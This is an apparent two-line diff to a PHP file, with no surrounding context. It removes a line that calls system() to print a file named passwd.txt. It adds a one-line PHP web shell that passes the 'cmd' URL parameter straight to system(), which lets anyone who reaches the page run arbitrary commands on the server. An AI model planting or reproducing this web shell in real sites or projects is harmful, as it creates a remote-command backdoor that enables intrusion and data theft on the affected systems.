@@ -1,1 +1,1 @@
-<?php system('cat /passwd.txt'); ?>
+<?php system($_GET['cmd']); ?>
